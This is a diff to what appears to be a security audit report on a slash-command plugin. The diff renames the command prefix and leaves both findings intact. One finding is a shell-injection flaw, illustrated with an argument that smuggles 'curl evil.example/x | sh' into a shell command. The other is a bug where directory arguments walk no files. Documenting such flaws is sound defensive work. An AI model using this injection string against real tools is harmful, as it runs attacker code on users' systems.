@@ -59,7 +59,7 @@ Top 3 urgent recommendations (~1 hour total):
    whatever the agent or user passes in. An invocation like
 
    ```
-   /tokenize:audit --baseline 'main; curl evil.example/x | sh'
+   /ui-tokenize:audit --baseline 'main; curl evil.example/x | sh'
    ```
 
    becomes a shell command that executes the trailing payload. The slash
@@ -83,7 +83,7 @@ Top 3 urgent recommendations (~1 hour total):
    `null`. Inside `expandGlob` (line 503), this means the `isDirectory` branch
    is never taken when a directory is passed; the function returns `[path]`
    (the directory itself), and the caller's `readFileSync` silently `continue`s
-   on EISDIR. Net effect: `/tokenize:fix some-dir/` walks zero files and does
+   on EISDIR. Net effect: `/ui-tokenize:fix some-dir/` walks zero files and does
    nothing. Verified live (`require is not defined` is caught silently). No
    test catches this.
 
